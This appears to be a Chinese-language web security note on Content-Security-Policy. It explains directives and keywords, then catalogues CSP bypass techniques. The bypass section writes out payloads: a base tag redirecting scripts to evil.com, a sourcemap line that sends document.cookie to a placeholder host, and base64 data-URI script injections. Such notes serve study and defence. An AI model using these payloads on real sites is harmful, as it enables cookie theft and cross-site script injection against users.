&lt;figure class=&#34;highlight http&#34;&gt;&lt;figcaption data-lang=&#34;HTTP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;HTTP header :&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&#34;Content-Security-Policy:&#34; 策略&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&#34;Content-Security-Policy-Report-Only:&#34; 策略&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;HTTP Content-Security-Policy 头可以指定一个或多个资源是安全的，而 Content-Security-Policy-Report-Only 则是允许服务器检查（非强制）一个策略。多个头的策略定义由优先采用最先定义的。&lt;/p&gt;
&lt;p&gt;HTML Meta :&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption data-lang=&#34;HTML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;meta&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;http-equiv&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;content-security-policy&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;策略&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;meta&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;http-equiv&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;content-security-policy-report-only&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;策略&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;指令说明&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#指令说明&#34;&gt;#&lt;/a&gt; 指令说明&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;指令&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;default-src&lt;/td&gt;
&lt;td&gt;定义资源默认加载策略&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;connect-src&lt;/td&gt;
&lt;td&gt;定义 Ajax、WebSocket 等加载策略&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;font-src&lt;/td&gt;
&lt;td&gt;定义 Font 加载策略&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;frame-src&lt;/td&gt;
&lt;td&gt;定义 Frame 加载策略&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;img-src&lt;/td&gt;
&lt;td&gt;定义图片加载策略&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;media-src&lt;/td&gt;
&lt;td&gt;定义 &amp;lt;audio&amp;gt;、&amp;lt;video&amp;gt; 等引用资源加载策略&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;object-src&lt;/td&gt;
&lt;td&gt;定义 &amp;lt;applet&amp;gt;、&amp;lt;embed&amp;gt;、&amp;lt;object&amp;gt; 等引用资源加载策略&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;script-src&lt;/td&gt;
&lt;td&gt;定义 JS 加载策略&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;style-src&lt;/td&gt;
&lt;td&gt;定义 CSS 加载策略&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;base-uri&lt;/td&gt;
&lt;td&gt;定义 &amp;lt;base&amp;gt; 根 URL 策略，不使用 default-src 作为默认值&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;sandbox&lt;/td&gt;
&lt;td&gt;值为 allow-forms，对资源启用 sandbox&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;report-uri&lt;/td&gt;
&lt;td&gt;值为 /report-uri，提交日志&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;关键字&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#关键字&#34;&gt;#&lt;/a&gt; 关键字&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;允许从任意 url 加载，除了  &lt;code&gt;data:&lt;/code&gt;   &lt;code&gt;blob:&lt;/code&gt;   &lt;code&gt;filesystem:&lt;/code&gt;   &lt;code&gt;schemes&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;e.g.  &lt;code&gt;img-src -&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;none&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;禁止从任何 url 加载资源&lt;/li&gt;
&lt;li&gt;e.g.  &lt;code&gt;object-src &#39;none&#39;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;self&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;只可以加载同源资源&lt;/li&gt;
&lt;li&gt;e.g.  &lt;code&gt;img-src &#39;self&#39;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;data:&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;可以通过 data 协议加载资源&lt;/li&gt;
&lt;li&gt;e.g.  &lt;code&gt;img-src &#39;self&#39; data:&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;domain.example.com&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;e.g.  &lt;code&gt;img-src domain.example.com&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;只可以从特定的域加载资源&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;\*.example.com&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;e.g.  &lt;code&gt;img-src \*.example.com&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;可以从任意 example.com 的子域处加载资源&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;https://cdn.com&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;e.g.  &lt;code&gt;img-src https://cdn.com&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;只能从给定的域用 https 加载资源&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;https:&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;e.g.  &lt;code&gt;img-src https:&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;只能从任意域用 https 加载资源&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;unsafe-inline&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;允许内部资源执行代码例如 style attribute,onclick 或者是 sicript 标签&lt;/li&gt;
&lt;li&gt;e.g.  &lt;code&gt;script-src &#39;unsafe-inline&#39;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;unsafe-eval&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;允许一些不安全的代码执行方式，例如 js 的 eval ()&lt;/li&gt;
&lt;li&gt;e.g.  &lt;code&gt;script-src &#39;unsafe-eval&#39;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;nonce-&amp;lt;base64-value&amp;gt;&#39;&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;使用随机的 nonce，允许加载标签上 nonce 属性匹配的标签&lt;/li&gt;
&lt;li&gt;e.g.  &lt;code&gt;script-src &#39;nonce-bm9uY2U=&#39;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;hash-algo&amp;gt;-&amp;lt;base64-value&amp;gt;&#39;&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;允许 hash 值匹配的代码块被执行&lt;/li&gt;
&lt;li&gt;e.g.  &lt;code&gt;script-src &#39;sha256-&amp;lt;base64-value&amp;gt;&#39;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;配置范例&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#配置范例&#34;&gt;#&lt;/a&gt; 配置范例&lt;/h3&gt;
&lt;p&gt;允许执行内联 JS 代码，但不允许加载外部资源&lt;/p&gt;
&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;figcaption data-lang=&#34;javascript&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Content&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Security&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Policy&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;default&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;src &lt;span class=&#34;token string&#34;&gt;&#39;self&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; script&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;src &lt;span class=&#34;token string&#34;&gt;&#39;self&#39;&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;unsafe-inline&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;bypass&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#bypass&#34;&gt;#&lt;/a&gt; Bypass&lt;/h2&gt;
&lt;h3 id=&#34;预加载&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#预加载&#34;&gt;#&lt;/a&gt; 预加载&lt;/h3&gt;
&lt;p&gt;浏览器为了增强用户体验，让浏览器更有效率，就有一个预加载的功能，大体是利用浏览器空闲时间去加载指定的内容，然后缓存起来。这个技术又细分为 DNS-prefetch、subresource、prefetch、preconnect、prerender。&lt;/p&gt;
&lt;p&gt;HTML5 页面预加载是用 link 标签的 rel 属性来指定的。如果 csp 头有 unsafe-inline，则用预加载的方式可以向外界发出请求，例如&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption data-lang=&#34;HTML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;&amp;lt;!-- 预加载某个页面 --&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;link&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;rel&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;prefetch&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;http://xxxx&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;&amp;lt;!-- firefox --&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;link&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;rel&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;prerender&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;http://xxxx&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;&amp;lt;!-- chrome --&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;&amp;lt;!-- 预加载某个图片 --&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;link&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;rel&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;prefetch&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;http://xxxx/x.jpg&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;&amp;lt;!-- DNS 预解析 --&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;link&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;rel&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;dns-prefetch&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;http://xxxx&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;&amp;lt;!-- 特定文件类型预加载 --&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;link&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;rel&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;preload&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;//xxxxx/xx.js&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;&amp;lt;!-- chrome --&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;另外，不是所有的页面都能够被预加载，当资源类型如下时，将阻止预加载操作：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;URL 中包含下载资源&lt;/li&gt;
&lt;li&gt;页面中包含音频、视频&lt;/li&gt;
&lt;li&gt;POST、PUT 和 DELET 操作的 ajax 请求&lt;/li&gt;
&lt;li&gt;HTTP 认证&lt;/li&gt;
&lt;li&gt;HTTPS 页面&lt;/li&gt;
&lt;li&gt;含恶意软件的页面&lt;/li&gt;
&lt;li&gt;弹窗页面&lt;/li&gt;
&lt;li&gt;占用资源很多的页面&lt;/li&gt;
&lt;li&gt;打开了 chrome developer tools 开发工具&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;mime-sniff&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#mime-sniff&#34;&gt;#&lt;/a&gt; MIME Sniff&lt;/h3&gt;
&lt;p&gt;举例来说，csp 禁止跨站读取脚本，但是可以跨站读 img，那么传一个含有脚本的 img，再 &lt;code&gt;&amp;lt;script href=&#39;http://xxx.com/xx.jpg&#39;&amp;gt;&lt;/code&gt; ，这里 csp 认为是一个 img，绕过了检查，如果网站没有回正确的 mime type，浏览器会进行猜测，就可能加载该 img 作为脚本&lt;/p&gt;
&lt;h3 id=&#34;302跳转&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#302跳转&#34;&gt;#&lt;/a&gt; 302 跳转&lt;/h3&gt;
&lt;p&gt;对于 302 跳转绕过 CSP 而言，实际上有以下几点限制：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;跳板必须在允许的域内。&lt;/li&gt;
&lt;li&gt;要加载的文件的 host 部分必须跟允许的域的 host 部分一致&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;iframe&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#iframe&#34;&gt;#&lt;/a&gt; iframe&lt;/h3&gt;
&lt;p&gt;当可以执行代码时，可以创建一个源为  &lt;code&gt;css&lt;/code&gt;   &lt;code&gt;js&lt;/code&gt;  等静态文件的 frame，在配置不当时，该 frame 并不存在 csp，则在该 frame 下再次创建 frame，达到 bypass 的目的。同理，使用  &lt;code&gt;../../../&lt;/code&gt;   &lt;code&gt;/%2e%2e%2f&lt;/code&gt;  等可能触发服务器报错的链接也可以到达相应的目的。&lt;/p&gt;
&lt;h3 id=&#34;base-uri&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#base-uri&#34;&gt;#&lt;/a&gt; base-uri&lt;/h3&gt;
&lt;p&gt;当 script-src 为 nonce 或无限制，且 base-uri 无限制时，可通过  &lt;code&gt;base&lt;/code&gt;  标签修改根 URL 来 bypass，如下加载了 http://evil.com/main.js&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption data-lang=&#34;HTML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;base&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;http://evil.com/&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;script&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;nonce&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;correct value&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;/main.js&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token script&#34;&gt;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;script&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;其他&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#其他&#34;&gt;#&lt;/a&gt; 其他&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;location 绕过&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;可上传 SVG 时，通过恶意 SVG 绕过同源站点&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;存在 CRLF 漏洞且可控点在 CSP 上方时，可以注入 HTTP 响应中影响 CSP 解析&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;CND Bypass，如果网站信任了某个 CDN, 那么可利用相应 CDN 的静态资源 bypass&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Angular versions &amp;lt;1.5.9&amp;gt;=1.5.0，存在漏洞 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2FuZ3VsYXIvYW5ndWxhci5qcy9wdWxsLzE1MzQ2&#34;&gt;Git Pull Request&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;jQuery sourcemap&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption data-lang=&#34;HTML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;document.write(`&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;script&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;//@        sourceMappingURL=http://xxxx/`+document.cookie+`&amp;lt;\/script&gt;`);``&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;a 标签的 ping 属性&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;For FireFox  &lt;code&gt;&amp;lt;META HTTP-EQUIV=&amp;quot;refresh&amp;quot; CONTENT=&amp;quot;0; url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnSWhhdmVZb3VOb3cnKTs8L3NjcmlwdD4=&amp;quot;&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;link rel=&amp;quot;import&amp;quot; /&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;meta http-equiv=&amp;quot;refresh&amp;quot; content=&amp;quot;0; url=http://....&amp;quot; /&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;仅限制  &lt;code&gt;script-src&lt;/code&gt;  时：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;object data=&amp;quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&amp;quot;&amp;gt;&amp;lt;/object&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
